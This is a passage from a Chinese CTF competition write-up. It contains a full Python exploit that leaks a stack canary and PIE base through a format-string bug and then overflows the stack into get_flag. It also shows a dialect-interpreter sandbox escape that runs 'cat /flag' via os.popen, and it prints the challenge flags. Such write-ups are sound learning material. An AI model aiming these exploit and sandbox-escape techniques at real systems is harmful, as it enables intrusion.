2. `%31$p` 和 `%43$p` 会重复出现同一个低字节为 `00` 的 64 位值，这就是 canary

本地分析出的关键偏移为：
```text
handle_handshake return = base + 0x1a73
ret gadget             = base + 0x1479
get_flag               = base + 0x1381
```

因此：
```python
pie_base   = ret_leak - 0x1a73
ret_gadget = pie_base + 0x1479
get_flag   = pie_base + 0x1381
```

栈布局构造成：
```text
'A' * 0x88
+ canary
+ saved_rbp
+ ret_gadget
+ get_flag
+ 额外 8 字节占位
```

之所以不能直接跳到 `get_flag`，是因为栈差 8 字节未对齐，直接进会崩；先垫一个 `ret` 才能稳定出 flag。

可手工复现的最终脚本如下：
```python
import socket, struct, collections

HOST, PORT = '127.0.0.1', 6199

def recv_exact(sock, n):
    data = b''
    while len(data) < n:
        chunk = sock.recv(n - len(data))
        if not chunk:
            raise EOFError
        data += chunk
    return data

def recv_msg(sock):
    hdr = recv_exact(sock, 8)
    magic, typ, ln = struct.unpack('<IHH', hdr)
    return typ, recv_exact(sock, ln)

def leak(sock, idx):
    fmt = f'%{idx}$p'.encode()
    payload = bytes([len(fmt)]) + fmt
    pkt = struct.pack('<IHH', 0x5252494d, 1, len(payload)) + payload
    sock.sendall(pkt)
    return recv_msg(sock)[1].decode(errors='ignore')

s = socket.create_connection((HOST, PORT), timeout=3)
vals = {i: leak(s, i) for i in range(28, 46)}

counts = collections.Counter(v for v in vals.values() if v.startswith('0x'))
canary = max(
    int(v, 16)
    for v, c in counts.items()
    if c >= 2 and (int(v, 16) & 0xff) == 0 and int(v, 16) > 0xffffffff
)

ret_leak = int(vals[45], 16)
pie_base = ret_leak - 0x1a73
ret_gadget = pie_base + 0x1479
get_flag = pie_base + 0x1381

payload = (
    b'A' * 0x88 +
    struct.pack('<Q', canary) +
    struct.pack('<Q', 0) +
    struct.pack('<Q', ret_gadget) +
    struct.pack('<Q', get_flag) +
    struct.pack('<Q', 0)
)

utf16_payload = b''.join(bytes([b, 0]) for b in payload)
body = b'B' * 0x14 + struct.pack('<i', len(payload)) + utf16_payload
pkt = struct.pack('<IHH', 0x5252494d, 2, len(body)) + body
s.sendall(pkt)
print(s.recv(4096).decode(errors='ignore'))
```

打通后可拿到：
```text
flag{48b765fb-c920-4b2d-9c5f-f3c6d4f0cbb7}
```

flag：
```text
flag{48b765fb-c920-4b2d-9c5f-f3c6d4f0cbb7}
```



## Misc

### myDataLeak-Revenge | Tang3nt

真正的坑不在 `cleaner.py`，而在题目给的最终 `cleaned_students.csv` 被二次篡改过。正确做法是自己重跑一份，再和题目给的文件做对比。

最简单的复现流程是：
1. 把题目目录复制到临时位置，避免覆盖原文件。
2. 在临时目录里跑：
```bash
python3 cleaner.py
```
3. 对比两份 CSV：
```bash
cmp -l cleaned_students.csv /tmp/.../cleaned_students.csv
```
或者直接按 CSV 读，筛异常记录。

可疑记录的特征是：
1. `id` 不是正常的 13 位学号
2. `name` 不是正常的 40 位 SHA1
3. `email` 域名异常，是 `edu.cn` 而不是 `whu.edu.cn`

最终能定位到 14 条伪造行，其 `name` 字段按顺序为：
```text
fla
g{5
504
a2b
5-d
82d
-4e
e1-
b11
9-c
6ac
f4d
07f
aa}
```

按顺序拼接即可得到 flag。

flag：
```text
flag{5504a2b5-d82d-4ee1-b119-c6acf4d07faa}
```

### 世说旧语 | N3x0r

最终代码

```Plain
翠花, 上 os.
res 装 os.popen("cat /flag").read().
嘀咕: res.
```

最初以为可以直接通过1、上海话里的python代码完成，但是发现几乎不可实现，大量重要代码被禁止。包括：open，exec，eval，等等，这表明使用python实现非常困难。

所以我们尝试使用给出的2、东北话，参考题目链接来完成。经过多次测试发现一直报错

```Plain
dialect> 翠花, 上 os!
dialect> f 装 整 os.popen("cat flag")!
dialect> 嘀咕: 整 f.read()!
dialect> .
[Output]
[RuntimeError] invalid syntax (<unknown>, line 2)
```

一直不知道为什么，拷打ai也得不到什么答案，后来我突然意识到，这个英文句号有问题，实际上，这个”整“会被包裹成int()，与.read()拼接了所以报错。直接使用python链式调用，就可以了。



## Osint

### 问卷调查 | Tang3nt

《提示词工程领域大神》

看似三人队实则单人队。感觉我应该是本次校赛用 AI 用的最多的人了。用的 codex (gpt-5.4-medium) 猛猛蹬。配置的 skills 来源于
[[https://github.com/ljagiello/ctf-skills]]

把这次比赛所有的与 codex 的聊天记录都上传到了 GitHub，以供证明：[[github.com/TangentZX/myCTFjourney/tree/main/WHUCTF2026]]

其实原本的打算是用 AI 来教我 web 方向的题目怎么做的，只是择队友不慎，不得不一个人当四个人用，为了比赛拿奖，拿 Agent 猛猛蹬。

出题人们应该也锐评过我了，唉。

不过相反，我也因为这次经历更加明白学习的重要性。Pentest 方向的《It's myrOOt!!!!!》，Web 方向的《世界上最好的大象》等题也有学习和手工复现、接受质询。

不会是队伍名 **所以我放弃了CTF** 的。

在以后也会继续学习 web 方向的知识，希望能继续打 CTF 吧。
